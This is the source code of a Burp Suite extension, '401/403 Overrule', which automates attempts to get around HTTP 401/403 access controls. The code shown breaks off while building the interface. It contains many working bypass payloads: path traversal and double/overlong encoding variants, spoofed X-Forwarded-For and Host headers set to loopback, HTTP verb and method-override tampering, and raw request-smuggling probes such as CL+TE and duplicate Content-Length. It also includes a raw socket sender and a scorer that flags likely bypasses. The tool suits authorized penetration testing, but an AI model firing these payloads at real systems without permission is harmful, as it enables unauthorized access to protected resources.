from burp import (IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener,
                  IMessageEditorController)
from javax.swing import (JPanel, JButton, JTable, JScrollPane, JSplitPane, JLabel,
                          JCheckBox, JTextField, BoxLayout, JMenuItem, SwingUtilities,
                          JProgressBar, JTabbedPane, JComboBox, JOptionPane, Box,
                          BorderFactory, JPopupMenu)
from javax.swing.table import DefaultTableModel
from javax.swing.table import TableRowSorter
from javax.swing.table import DefaultTableCellRenderer
from javax.swing import SwingConstants
from java.awt import BorderLayout, Dimension, GridLayout, FlowLayout, Font, Color
from java.awt.event import MouseAdapter, MouseEvent
from java.util import ArrayList
from java.net import Socket, InetSocketAddress
from javax.net.ssl import SSLSocketFactory
from java.lang import Boolean as JBoolean, Object as JObject
from threading import Thread
import random
import re
import hashlib

# ---------------------------------------------------------------------------
# UI color palette (buttons stick to red / dark yellow / green only)
# ---------------------------------------------------------------------------
BTN_GREEN = Color(39, 174, 96)        # positive / run / send actions
BTN_YELLOW = Color(255, 165, 0)      # dark yellow / caution / resume
BTN_RED = Color(192, 57, 43)          # stop / clear / destructive
BTN_TEXT = Color.WHITE

TITLE_BG = Color(33, 37, 41)
TITLE_ACCENT = Color(39, 174, 96)
TITLE_FG = Color(245, 245, 245)
TITLE_SUB_FG = Color(173, 181, 189)


def style_button(btn, color, text_color=BTN_TEXT):
    """Apply a flat, consistent look to a JButton from the red/yellow/green palette."""
    btn.setBackground(color)
    btn.setForeground(text_color)
    btn.setFont(Font("SansSerif", Font.BOLD, 12))
    btn.setOpaque(True)
    btn.setBorderPainted(False)
    btn.setFocusPainted(False)
    btn.setBorder(BorderFactory.createEmptyBorder(6, 14, 6, 14))
    return btn

# ---------------------------------------------------------------------------
# Embedded payload lists
# ---------------------------------------------------------------------------
ENDPATHS = [ "?", "??", "/", "//", "/.", "/./", "/..;/", "..\\;/", "..;/", "~", "%00", "%09", "%0A", "%0D", "%20", "%20/", "%25", "%23", "%26", "%3f", "&", ".", "..", "..;", "..\\;", "./", ".css", ".html", ".json", ".php", ".svc", ".svc?wsdl", ".wsdl", "???", "?WSDL", "?debug=1", "?debug=true", "?param", "?testparam", "\\/\\/", "/..%3B/", "/*", ";%2f..%2f..%2f", "?&", ";/", "%0b", "%0c", "%1f", "%00/", "%09/", "%0a/", "%0d%0a", ".xml", ".asp", ".aspx", ".jsp", ".do", ".action", ".bak", ".orig", ";.css", ";.js", ";.png", ";.ico", ";.svg", "%3Ffoo.php", "%3F.php", "%23foo"] 

MIDPATHS = ["./", "%", "%09", "%09%3b", "%09..", "%09;", "%20", "%20/", "%23", "%23%3f", "%252f%252f", "%252f/", "%26", "%2e", "%2e%2e", "%2e%2e%2f", "%2e%2e/", "%2e/", "%2f", "%2f%20%23", "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3f", "%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e.", "%3b%2f..", "%3b/%2e.", "%3b/..", "%3b//%2f../", "%3f", "%3f%23", "%3f%3f", "&", ".%2e/", "..", "..%00/", "..%00;/", "..%09", "..%0d/", "..%2f", "..%3B", "..%5c", "..%5c/", "..%ff", "..%ff;/", "../", ".././", "..;", "..;%00/", "..;%0d/", "..;%ff/", "..;/", "..;\\;", "..;\\\\", "..\\;", "..\\\\", "./", "./.", ".//./", ".;/", ".\\;/", ".html", ".json", "/", "/%20#", "/%20%23", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%3b/", "/%2e/", "/%2f", "/%3b/", "/*", "/*/", "/.", "/..", "/..%2f", "/./..%2f", "/..%2f..%2f", "/..%252F", "/../", "/../../", "/../..;/", "/.././../", "/../.;/../", "/..//", "/..//../", "/../;/", "/..;%2f", "/..;/", "/..;/../", "/..;/..;/", "/..;//", "/..;/;/", "/./", "/.//", "/.;/", "/.;//", "/.randomstring", "//", "//.", "//..", "//../../", "//..;", "//./", "//.;/", "///..", "///../", "///..;/", "////", "//;/", "//?anything", "/;/", "/;//", "/;x", "/;x/", "/x/../", "/x/..;/", "/x/;/../", ";", ";%09", ";%09..", ";%09;", ";%2f%2e%2e", ";%2f..", ";%2f..%2f/", ";%2f..%2f/../", ";%2f..//..%2f", ";%2f..//../", ";%2f..;///", ";%2f..;//;/", ";%2f//..%2f", ";%2f/;/../", ";/%2e%2e", ";/%2e%2e%2f/", ";/%2e%2e/", ";/%2e.", ";/.%2e", ";/..", ";/..%2f", ";/..%2f..%2f", ";/../", ";/../../", ";/.././../", ";/../.;/../", ";/..//", ";/..//../", ";/../;/", ";/..;", ";/.;.", ";//..", ";//../../", ";///..", ";foo=bar/", ";x", ";x/", ";x;", "?", "??", "???", "\\..\\.\\", "\\", "\\\\", "\\..\\", "\\..\\\\", "%5c", "%5c..%5c", "..%5c..%5c", "//%252e/", "//%252e%252e/", "/%252e%252e/", "%3f"]

HEADER_NAMES = [
    "CF-Connecting-IP", "CF-Connecting_IP", "Client-IP", "Forwarded", "Host",
    "Origin", "Proxy", "Proxy-Host", "Proxy-Url", "Real-Ip", "Referer",
    "Referrer", "Request-Uri", "True-Client-IP", "X-Client-IP",
    "X-Custom-IP-Authorization", "X-Forwarded", "X-Forwarded-For",
    "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Server", "X-Host",
    "X-HTTP-DestinationURL", "X-HTTP-Host-Override", "X-Original-Remote-Addr",
    "X-Original-URL", "X-Originating-IP", "X-Proxy-Url", "X-Real-IP",
    "X-Referrer", "X-Remote-Addr", "X-Remote-IP", "X-Rewrite-URL",
    "X-WAP-Profile", "X-Real-Ip", "X-True-IP"
]

IPS = [
    "*", "0.0.0.0", "0177.0000.0000.0001", "0x7F000001", "10.0.0.1",
    "127.0.0.1", "127.1", "172.16.0.1", "172.17.0.1", "192.168.1.1",
    "8.8.8.8", "localhost", "null", "::1", "[::1]", "::ffff:127.0.0.1"
]

HTTP_METHODS = [
    "CONNECT", "COPY", "DELETE", "GET", "HEAD", "LABEL", "LOCK", "MOVE",
    "OPTIONS", "PATCH", "POST", "POUET", "PUT", "TRACE", "TRACK",
    "UNCHECKOUT", "UPDATE", "VERSION-CONTROL"
]

SIMPLE_HEADERS = [
    ("Referer", "/admin"), ("X-HTTP-Method-Override", "POST"),
    ("X-HTTP-Method-Override", "PUT"), ("X-HTTP-Method-Override", "PATCH"),
    ("X-HTTP-Method", "GET"), ("X-HTTP-Method", "POST"),
    ("X-Method-Override", "GET"), ("X-Method-Override", "POST"),
    ("X-Original-URL", "/admin"), ("X-Override-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"), ("X-Forwarded-Port", "80"),
    ("X-Forwarded-Port", "443"), ("X-Forwarded-Port", "4443"),
    ("X-Forwarded-Port", "8080"), ("X-Forwarded-Port", "8443"),
    ("Content-Type", "application/json"), ("Content-Type", "application/xml"),
    ("Content-Type", "text/plain"),
    ("Content-Type", "application/x-www-form-urlencoded"),
    ("Content-Type", "multipart/form-data")
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
]

HOP_BY_HOP_TARGETS = [
    ("X-Forwarded-For", "127.0.0.1"), ("X-Real-IP", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"), ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Original-URL", "/"), ("X-Rewrite-URL", "/"),
    ("CF-Connecting-IP", "127.0.0.1"), ("True-Client-IP", "127.0.0.1"),
]

HOST_OVERRIDE_EXTRA_TEMPLATES = [
    "X-Forwarded-Host localhost", "X-Forwarded-Host trailing dot",
    "X-Forwarded-Server localhost", "X-Host localhost",
    "X-HTTP-Host-Override localhost", "original host split",
    "Host trailing dot", "Host uppercase",
]

FORWARDED_TRUST_TEMPLATES = [
    ("Forwarded localhost", [("Forwarded", "for=127.0.0.1;proto=https;host=localhost")]),
    ("Forwarded IPv6 loopback", [("Forwarded", "for=\"[::1]\";proto=https")]),
    ("Forwarded chain localhost first", [("Forwarded", "for=127.0.0.1, for=198.51.100.1")]),
    ("Forwarded chain localhost last", [("Forwarded", "for=198.51.100.1, for=127.0.0.1")]),
    ("Client-IP cluster pair", [("Client-IP", "127.0.0.1"), ("Cluster-Client-IP", "127.0.0.1")]),
    ("forwarded client ip trio", [("X-Forwarded-For", "127.0.0.1"), ("X-Client-IP", "127.0.0.1"), ("True-Client-IP", "127.0.0.1")]),
    ("original/remote addr", [("X-Original-Remote-Addr", "127.0.0.1"), ("X-Remote-IP", "127.0.0.1")]),
]

PROTO_CONFUSION_TEMPLATES = [
    ("https 443", [("X-Forwarded-Proto", "https"), ("X-Forwarded-Port", "443")]),
    ("http 80", [("X-Forwarded-Proto", "http"), ("X-Forwarded-Port", "80")]),
    ("forwarded ssl on", [("X-Forwarded-Proto", "https"), ("X-Forwarded-Ssl", "on")]),
    ("front-end https url-scheme", [("Front-End-Https", "on"), ("X-Url-Scheme", "https")]),
    ("protocol/original scheme", [("X-Forwarded-Protocol", "https"), ("X-Original-Scheme", "https")]),
    ("https host localhost", [("X-Forwarded-Proto", "https"), ("X-Forwarded-Host", "localhost"), ("X-Forwarded-Port", "443")]),
]

IP_ENCODING_VALUES = [
    "127.0.0.1", "127.1", "0177.0.0.1", "0x7f.0x0.0x0.0x1",
    "2130706433", "localhost", "[::1]", "::ffff:127.0.0.1",
]
IP_ENCODING_HEADERS = [
    "X-Forwarded-For", "Client-IP", "True-Client-IP", "X-Real-IP", "CF-Connecting-IP",
]

SUFFIX_TRICKS = [
    ".json", ".css", ".js", ";", ";index.html",
    "?download=1", "?format=json", "?output=1",
]

RAW_DESYNC_PROBES = [
    {
        "method": "POST", "label": "CL+TE chunked zero-body",
        "headers": [("Transfer-Encoding", "chunked"), ("Content-Length", "4"), ("Content-Type", "application/x-www-form-urlencoded")],
        "body": "0\r\n\r\n",
    },
    {
        "method": "POST", "label": "duplicate content-length",
        "headers": [("Content-Length", "0"), ("Content-Length", "8"), ("Content-Type", "application/x-www-form-urlencoded")],
        "body": "_=1&_2=2",
    },
    {
        "method": "OPTIONS", "label": "OPTIONS *", "request_target": "*",
        "headers": [("Content-Length", "0")],
        "body": "",
    },
    {
        "method": "GET", "label": "GET with chunked framing",
        "headers": [("Transfer-Encoding", "chunked"), ("Content-Length", "0")],
        "body": "0\r\n\r\n",
    },
    {
        "method": "POST", "label": "duplicate transfer-encoding",
        "headers": [("Transfer-Encoding", "chunked"), ("Transfer-Encoding", "identity"), ("Content-Length", "4")],
        "body": "0\r\n\r\n",
    },
    {
        "method": "POST", "label": "spaced transfer-encoding",
        "headers": [("Transfer-Encoding", " chunked"), ("Content-Length", "4")],
        "body": "0\r\n\r\n",
    },
]

RAW_DUPLICATE_TEMPLATES = [
    ("duplicate x-forwarded-for", [("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-For", "1.1.1.1")]),
    ("duplicate x-original-url", [("X-Original-URL", "/"), ("X-Original-URL", None)]),
    ("duplicate x-rewrite-url", [("X-Rewrite-URL", "/"), ("X-Rewrite-URL", None)]),
    ("duplicate forwarded chain", [("Forwarded", "for=127.0.0.1;host=localhost"), ("Forwarded", None)]),
]

RAW_AUTHORITY_TEMPLATES = [
    ("duplicate host localhost", [("Host", None), ("Host", "localhost")]),
    ("duplicate host original last", [("Host", "localhost"), ("Host", None)]),
    ("duplicate forwarded host", [("Forwarded", "host=localhost;proto=https"), ("Forwarded", None)]),
    ("host plus override localhost", [("Host", None), ("X-HTTP-Host-Override", "localhost")]),
]

CALIBRATION_PATHS = ["calibration_test_123456", "calib_nonexist_789xyz", "zz_calibrate_000"]
CALIBRATION_TOLERANCE_DEFAULT = 5  

IP_HEADER_HINTS = ("IP", "FORWARD", "CLIENT", "REAL", "ORIGIN", "TRUE-CLIENT", "CONNECTING", "REMOTE")
URL_HEADER_HINTS = ("URL", "URI", "HOST", "REFERER", "REFERRER", "ORIGIN", "PROXY", "DESTINATION", "REWRITE", "OVERRIDE")

def classify_header(name):
    up = name.upper()
    if any(h in up for h in IP_HEADER_HINTS):
        return "ip"
    if any(h in up for h in URL_HEADER_HINTS):
        return "url"
    return "generic"

def case_variants(word, n=4):
    seen = set()
    out = []
    tries = 0
    while len(out) < n and tries < 30:
        tries += 1
        variant = "".join(c.upper() if random.random() < 0.5 else c.lower() for c in word)
        if variant not in seen and variant != word:
            seen.add(variant)
            out.append(variant)
    return out

def insert_midpath(path, payload):
    if not path.startswith("/"):
        path = "/" + path
    segments = path.split("/")
    if len(segments) <= 1:
        return "/" + payload + path
    last = segments[-1]
    prefix = "/".join(segments[:-1])
    if not prefix:
        prefix = ""
    return prefix + "/" + payload + last

def append_endpath(path, payload):
    if payload.startswith("?") or payload.startswith("&"):
        if "?" in path:
            return path + payload.replace("?", "&", 1) if payload.startswith("?") else path + payload
        return path + payload
    if path.endswith("/"):
        return path + payload.lstrip("/")
    return path + payload

def double_encode_char(ch):
    single = "%%%X" % ord(ch)
    return "%25" + single[1:]

def split_last_segment(path):
    trimmed = path.strip("/")
    segments = trimmed.split("/") if trimmed else [""]
    last_seg = segments[-1]
    if len(segments) > 1:
        base_path = "/" + "/".join(segments[:-1]) + "/"
    else:
        base_path = "/"
    return base_path, last_seg

def build_double_encoding_payloads(path):
    payloads = []
    if not path or path == "/":
        return payloads

    for i, c in enumerate(path):
        if c == "/":
            continue
        modified = path[:i] + double_encode_char(c) + path[i + 1:]
        payloads.append(("per-char[%d]=%s -> %s" % (i, c, modified), modified))

    base_path, last_seg = split_last_segment(path)
    trailing_slash = path.endswith("/")

    if last_seg:
        modified = base_path + last_seg[:-1] + double_encode_char(last_seg[-1])
        if trailing_slash:
            modified += "/"
        payloads.append(("last-char -> %s" % modified, modified))

    if len(last_seg) > 1:
        full = base_path + "".join(double_encode_char(c) for c in last_seg)
        if trailing_slash:
            full += "/"
        payloads.append(("full-segment -> %s" % full, full))

    seen = set()
    deduped = []
    for detail, p in payloads:
        if p not in seen:
            seen.add(p)
            deduped.append((detail, p))
    return deduped

def build_unicode_encoding_payloads(path):
    payloads = []
    if not path or path == "/":
        return payloads

    overlong_replacements = [
        ("/", "%c0%af"), ("/", "%u002f"), ("/", "%e0%80%af"),
        ("/", "%f0%80%80%af"), ("/", "%252f"),
    ]
    for orig, encoded in overlong_replacements:
        if len(path) > 1 and orig in path[1:]:
            modified = "/" + path[1:].replace(orig, encoded)
            payloads.append(("slash -> %s" % encoded, modified))

    base_path, last_seg = split_last_segment(path)
    for i, c in enumerate(last_seg):
        unicode_encoded = "%%u%04x" % ord(c)
        modified = base_path + last_seg[:i] + unicode_encoded + last_seg[i + 1:]
        payloads.append(("unicode[%d]=%s -> %s" % (i, c, unicode_encoded), modified))

        if ord(c) < 128:
            byte1 = 0xC0 | (ord(c) >> 6)
            byte2 = 0x80 | (ord(c) & 0x3F)
            overlong_encoded = "%%%02x%%%02x" % (byte1, byte2)
            modified2 = base_path + last_seg[:i] + overlong_encoded + last_seg[i + 1:]
            payloads.append(("overlong[%d]=%s -> %s" % (i, c, overlong_encoded), modified2))

    return payloads

def build_path_normalization_payloads(path, query_suffix):
    if not path or path == "/":
        return []
    trailing_slash = path.endswith("/")
    trimmed = path.strip("/")
    segments = trimmed.split("/") if trimmed else [""]
    last_segment = segments[-1]
    if len(segments) > 1:
        base_path = "/" + "/".join(segments[:-1]) + "/"
    else:
        base_path = "/"

    payloads = [
        base_path + "%2e/" + last_segment,
        base_path + ".%2e/" + last_segment,
        base_path + "%2e%2e/" + last_segment,
        base_path + "..%2f" + last_segment,
        base_path + "%2e%2e%2f" + last_segment,
        base_path + last_segment + "/.",
        base_path + last_segment + "/%2e",
        base_path + ";" + last_segment,
    ]
    if trailing_slash:
        payloads.append(base_path + last_segment + "/..;/")

    seen = set()
    out = []
    for p in payloads:
        full = p + query_suffix
        if full not in seen:
            seen.add(full)
            out.append(full)
    return out

def build_suffix_tricks_payloads(path, query, raw_query):
    if not path or path == "/":
        return []
    payloads = [
        path + ".json" + query, path + ".css" + query, path + ".js" + query,
        path + ";" + query, path + ";index.html" + query,
        path + "?download=1", path + "?format=json", path + "?output=1",
    ]
    if raw_query:
        payloads.append(path + ";?" + raw_query)
        payloads.append(path + ".json?" + raw_query)
    seen = set()
    out = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out

def build_absolute_uri_request_targets(scheme, host, path_and_query):
    return [
        scheme + "://" + host + path_and_query,
        scheme + "://anything@" + host + path_and_query,
    ]

REDIRECT_DENY_TOKENS = ("login", "signin", "sign-in", "auth", "forbidden", "denied", "unauthorized", "403", "error")

def status_priority(status):
    if status is None: return 1
    if 200 <= status < 300: return 5
    if 300 <= status < 400: return 4
    if status in (401, 403): return 2
    if 400 <= status < 500: return 1
    if status >= 500: return 0
    return 1

def looks_like_access_control_redirect(location):
    if not location:
        return False
    loc = location.lower()
    return any(tok in loc for tok in REDIRECT_DENY_TOKENS)

def has_anomalous_redirect(status, location, baseline):
    if status is None or status < 300 or status >= 400 or not location:
        return False
    if looks_like_access_control_redirect(location):
        return False
    if baseline["location"] and baseline["location"] != location:
        return True
    if baseline["status"] is None or baseline["status"] < 300 or baseline["status"] >= 400:
        return False  
    loc_lower = location.lower()
    return loc_lower.startswith("/") or loc_lower.startswith("http://") or loc_lower.startswith("https://")

def is_same_status_empty_body(status, length, baseline):
    return baseline["status"] is not None and baseline["status"] == status and length == 0

def classify_likelihood(score):
    if score >= 80: return "HIGH"
    if score >= 55: return "MED"
    return "LOW"

def score_result(status, length, location, content_type, server, body_hash, baseline, tolerance):
    score = 0
    base_status = baseline["status"]
    base_priority = status_priority(base_status)
    result_priority = status_priority(status)
    access_control_redirect = looks_like_access_control_redirect(location)
    anomalous_redirect = has_anomalous_redirect(status, location, baseline)

    if status is not None:
        if 200 <= status < 300: score += 55
        elif 300 <= status < 400: score += 22
        elif status in (401, 403): score += 4
        elif status in (400, 404): score -= 2
        elif 400 <= status < 500: score -= 3

    if base_status is not None and status != base_status:
        if result_priority > base_priority: score += 30
        elif result_priority == base_priority: score += 8
        else: score -= 4

    diff = abs((length or 0) - (baseline["length"] or 0))
    if diff > tolerance * 4: score += 22
    elif diff > tolerance * 2: score += 14
    elif diff > tolerance: score += 8

    body_changed = bool(baseline["body_hash"]) and bool(body_hash) and baseline["body_hash"] != body_hash
    if body_changed: score += 10
    if baseline["location"] != location: score += 6
    if baseline["content_type"] and baseline["content_type"] != content_type: score += 5
    if baseline["server"] and baseline["server"] != server: score += 4
    if anomalous_redirect: score += 10
    if status is not None and 300 <= status < 400 and (length or 0) == 0: score -= 12
    if access_control_redirect: score -= 22
    if status is not None and 300 <= status < 400 and (not anomalous_redirect or access_control_redirect):
        if score > 24: score = 24

    if base_status == status:
        if body_changed and (length or 0) > 0: score += 14
        if not is_same_status_empty_body(status, length, baseline):
            if diff > tolerance * 4: score += 10
            elif diff > tolerance * 2: score += 6
            elif diff > tolerance: score += 3
        if baseline["content_type"] and baseline["content_type"] != content_type: score += 6
        if baseline["location"] and baseline["location"] != location: score += 8
        if baseline["server"] and baseline["server"] != server: score += 3

    if is_same_status_empty_body(status, length, baseline): score -= 18

    if diff <= tolerance and status == base_status: score -= 20
    if status in (400, 404) and diff <= tolerance and body_hash == baseline["body_hash"]: score -= 10

    if score < 0: score = 0
    if score > 100: score = 100
    return score

def score_reason(status, length, location, content_type, server, body_hash, baseline, tolerance):
    reasons = []
    if baseline["status"] is not None and status != baseline["status"]:
        reasons.append("status %s->%s" % (baseline["status"], status))
    diff = abs((length or 0) - (baseline["length"] or 0))
    if diff > tolerance: reasons.append("len \u0394%d" % diff)
    if baseline["body_hash"] and body_hash and baseline["body_hash"] != body_hash:
        reasons.append("body changed")
    if baseline["location"] != location: reasons.append("location changed")
    if baseline["content_type"] and baseline["content_type"] != content_type: reasons.append("type changed")
    if baseline["server"] and baseline["server"] != server: reasons.append("server changed")
    if has_anomalous_redirect(status, location, baseline): reasons.append("redirect anomaly")
    if looks_like_access_control_redirect(location): reasons.append("redirect to access control")
    return ", ".join(reasons) if reasons else "minor variation"

class Result(object):
    __slots__ = ("technique", "detail", "method", "status", "length",
                 "interesting", "request_bytes", "response_bytes", "http_service",
                 "location", "content_type", "server", "body_hash",
                 "score", "likelihood", "reason")

    def __init__(self, technique, detail, method, status, length, interesting,
                 request_bytes, response_bytes, http_service,
                 location=None, content_type=None, server=None, body_hash=None,
                 score=0, likelihood="LOW", reason=""):
        self.technique = technique
        self.detail = detail
        self.method = method
        self.status = status
        self.length = length
        self.interesting = interesting
        self.request_bytes = request_bytes
        self.response_bytes = response_bytes
        self.http_service = http_service
        self.location = location
        self.content_type = content_type
        self.server = server
        self.body_hash = body_hash
        self.score = score
        self.likelihood = likelihood
        self.reason = reason

TECHNIQUE_TABS = [
    ("Baseline", ("default",)),
    ("Verb Tampering", ("verb-tampering",)),
    ("Verb Case Switching", ("verb-tampering-case",)),
    ("Header Spoofing", ("headers-ip", "headers-url", "headers-generic")),
    ("Simple Header Pairs", ("simpleheaders",)),
    ("Hop-by-Hop", ("hop-by-hop",)),
    ("Header Confusion", ("header-confusion",)),
    ("Forwarded Trust", ("forwarded-trust",)),
    ("Proto Confusion", ("proto-confusion",)),
    ("IP Encoding", ("ip-encoding",)),
    ("End-Path Payloads", ("endpaths",)),
    ("Mid-Path Payloads", ("midpaths",)),
    ("Path Normalization", ("path-normalization",)),
    ("Suffix Tricks", ("suffix-tricks",)),
    ("Double Encoding", ("double-encoding",)),
    ("Unicode Encoding", ("unicode-encoding",)),
    ("Method Override", ("method-override-header", "method-override-query")),
    ("Host Override", ("host-override",)),
    ("Path Case Switching", ("path-case-switching",)),
    ("User-Agent Sweep", ("user-agent-sweep",)),
    ("HTTP Versions", ("http-versions", "http-parser")),
    ("Absolute-URI", ("absolute-uri",)),
    ("Raw Duplicates", ("raw-duplicates",)),
    ("Raw Authority", ("raw-authority",)),
    ("Raw Desync", ("raw-desync",)),
]

TECHNIQUE_KEY_TO_TAB = {}
for _tab_name, _keys in TECHNIQUE_TABS:
    for _k in _keys:
        TECHNIQUE_KEY_TO_TAB[_k] = _tab_name

TAB_NAME_TO_KEYS = dict(TECHNIQUE_TABS)

class RawResponse(object):
    __slots__ = ("status", "length", "location", "content_type", "server",
                 "body_hash", "raw_bytes")

    def __init__(self, status, length, location, content_type, server, body_hash, raw_bytes):
        self.status = status
        self.length = length
        self.location = location
        self.content_type = content_type
        self.server = server
        self.body_hash = body_hash
        self.raw_bytes = raw_bytes

def build_raw_request_bytes(method, request_target, http_version, header_lines, body):
    """
    Build the raw bytes of an HTTP request line-by-line (so we keep full
    control over things like duplicate headers, absolute-URI request
    targets, or non-standard HTTP versions) WITHOUT opening our own socket.
    The resulting bytes are handed to Burp's callbacks.makeHttpRequest(),
    which sends them over Burp's own network stack (upstream proxy, SOCKS,
    TLS/SNI, connection pooling all still apply) instead of a bare
    java.net.Socket that bypasses Burp entirely and can silently fail to
    even leave the machine.
    """
    lines = ["%s %s %s" % (method, request_target, http_version)]
    has_connection = False
    for name, val in header_lines:
        lines.append("%s: %s" % (name, val))
        if name.lower() == "connection":
            has_connection = True
    if not has_connection:
        lines.append("Connection: close")
    request_text = "\r\n".join(lines) + "\r\n\r\n"

    req_bytes = bytearray(request_text, "iso-8859-1")
    if body:
        req_bytes += bytearray(body, "iso-8859-1") if isinstance(body, (str, unicode)) else bytearray(body)
    return req_bytes


def raw_http_request(host, port, use_https, method, request_target, header_lines,
                      body, http_version="HTTP/1.1", timeout_ms=10000):
    sock = None
    try:
        if use_https:
            factory = SSLSocketFactory.getDefault()
            sock = factory.createSocket()
        else:
            sock = Socket()
        sock.connect(InetSocketAddress(host, port), timeout_ms)
        sock.setSoTimeout(timeout_ms)

        lines = ["%s %s %s" % (method, request_target, http_version)]
        has_connection = False
        for name, val in header_lines:
            lines.append("%s: %s" % (name, val))
            if name.lower() == "connection":
                has_connection = True
        if not has_connection:
            lines.append("Connection: close")
        request_text = "\r\n".join(lines) + "\r\n\r\n"

        out = sock.getOutputStream()
        out.write(bytearray(request_text, "iso-8859-1"))
        if body:
            out.write(bytearray(body, "iso-8859-1") if isinstance(body, (str, unicode)) else bytearray(body))
        out.flush()

        ins = sock.getInputStream()
        buf = bytearray()
        chunk = bytearray(8192)
        while True:
            n = ins.read(chunk)
            if n == -1:
                break
            buf.extend(chunk[:n])
        raw_bytes = bytes(buf)
        return parse_raw_http_response(raw_bytes)
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass

def parse_raw_http_response(raw_bytes):
    if not raw_bytes:
        return RawResponse(None, None, None, None, None, None, raw_bytes)
    text = raw_bytes.decode("iso-8859-1", "replace") if isinstance(raw_bytes, bytes) else str(raw_bytes)
    sep = text.find("\r\n\r\n")
    if sep == -1:
        sep = text.find("\n\n")
        header_blob = text[:sep] if sep != -1 else text
        body = text[sep + 2:] if sep != -1 else ""
    else:
        header_blob = text[:sep]
        body = text[sep + 4:]

    header_lines = header_blob.split("\r\n") if "\r\n" in header_blob else header_blob.split("\n")
    status = None
    if header_lines:
        m = re.match(r"HTTP/\d(?:\.\d)?\s+(\d+)", header_lines[0])
        if m:
            status = int(m.group(1))

    location = None
    content_type = None
    server = None
    declared_len = None
    is_chunked = False
    for hl in header_lines[1:]:
        if ":" not in hl:
            continue
        name, _, val = hl.partition(":")
        name = name.strip().lower()
        val = val.strip()
        if name == "location":
            location = val
        elif name == "content-type":
            content_type = val
        elif name == "server":
            server = val
        elif name == "content-length":
            try:
                declared_len = int(val.split(",")[0].strip())
            except ValueError:
                pass
        elif name == "transfer-encoding" and "chunked" in val.lower():
            is_chunked = True

    if is_chunked:
        decoded = []
        rest = body
        while rest:
            idx = rest.find("\r\n")
            if idx == -1:
                break
            size_line = rest[:idx].split(";")[0].strip()
            try:
                size = int(size_line, 16)
            except ValueError:
                break
            if size == 0:
                break
            chunk_data = rest[idx + 2: idx + 2 + size]
            decoded.append(chunk_data)
            rest = rest[idx + 2 + size + 2:]
        body_for_hash = "".join(decoded)
        length = len(body_for_hash)
    else:
        body_for_hash = body
        length = declared_len if declared_len is not None else len(body)

    body_hash = hashlib.md5(body_for_hash.encode("utf-8", "replace")).hexdigest() if body_for_hash else ""
    return RawResponse(status, length, location, content_type, server, body_hash, raw_bytes)

class _SelectedResultEditorController(IMessageEditorController):
    def __init__(self):
        self.current_result = None

    def getHttpService(self):
        return self.current_result.http_service if self.current_result else None

    def getRequest(self):
        return self.current_result.request_bytes if self.current_result else None

    def getResponse(self):
        return self.current_result.response_bytes if self.current_result else None

class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener):

    EXTENSION_NAME = "401/403 Overrule"

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName(self.EXTENSION_NAME)

        self._base_request = None      
        self._base_service = None      
        self._base_info = None         
        self._results = []
        self._stop_flag = [False]
        self._baseline_cache = None    
        self._active_tab = None        

        # Cumulative/global progress tracking across ALL technique tabs.
        # This is the total number of jobs across every tab (recomputed
        # lazily whenever it is invalidated) and is independent of which
        # single tab happens to be running right now.
        self._global_total_ops = None

        self._build_ui()
        callbacks.registerContextMenuFactory(self)
        callbacks.addSuiteTab(self)
        callbacks.registerExtensionStateListener(self)

        self._log("401/403 Overrule extension loaded. Right-click a request -> "
                   "'Send to 403 Bypass' to get started.")

    # ---------------------------------------------------------- UI wiring
    def _build_ui(self):
        self._panel = JPanel(BorderLayout())

        # Initialize GLOBAL data tracking
        self._tab_data = {}
        self._tab_data["GLOBAL"] = {"pending_ops": []}

        # Top area using BorderLayout to put settings on the left and Title on the right
        top = JPanel(BorderLayout())
        
        left_top = JPanel()
        left_top.setLayout(BoxLayout(left_top, BoxLayout.Y_AXIS))

        info_row = JPanel(FlowLayout(FlowLayout.LEFT))
        info_row.add(JLabel("Target:"))
        self._target_field = JTextField("(right-click a request -> Send to 403 Bypass)", 60)
        self._target_field.setEditable(False)
        info_row.add(self._target_field)
        left_top.add(info_row)

        settings_row = JPanel(FlowLayout(FlowLayout.LEFT))
        self._cb_calibrate = JCheckBox("Auto-calibrate baseline (--no-calibrate if off)", True)
        self._cb_strict_calibrate = JCheckBox("Strict calibrate (body hash + headers)", False)
        self._cb_only_interesting = JCheckBox("Only show interesting (diff from baseline)", True)
        settings_row.add(self._cb_calibrate)
        settings_row.add(self._cb_strict_calibrate)
        settings_row.add(self._cb_only_interesting)
        
        # New Global Buttons
        self._btn_run_all_tabs = JButton("Run All Tabs", actionPerformed=lambda e: self._on_run_all_tabs())
        style_button(self._btn_run_all_tabs, BTN_GREEN)
        settings_row.add(self._btn_run_all_tabs)
        
        self._btn_stop_all = JButton("Stop All", actionPerformed=lambda e: self._on_stop_all())
        style_button(self._btn_stop_all, BTN_RED)
        self._btn_stop_all.setEnabled(False)
        settings_row.add(self._btn_stop_all)
        
        self._btn_resume_all = JButton("Resume All", actionPerformed=lambda e: self._on_resume_all())
        style_button(self._btn_resume_all, BTN_YELLOW)
        self._btn_resume_all.setEnabled(False)
        settings_row.add(self._btn_resume_all)

        self._btn_clear_all = JButton("Clear All", actionPerformed=lambda e: self._on_clear_all_tabs())
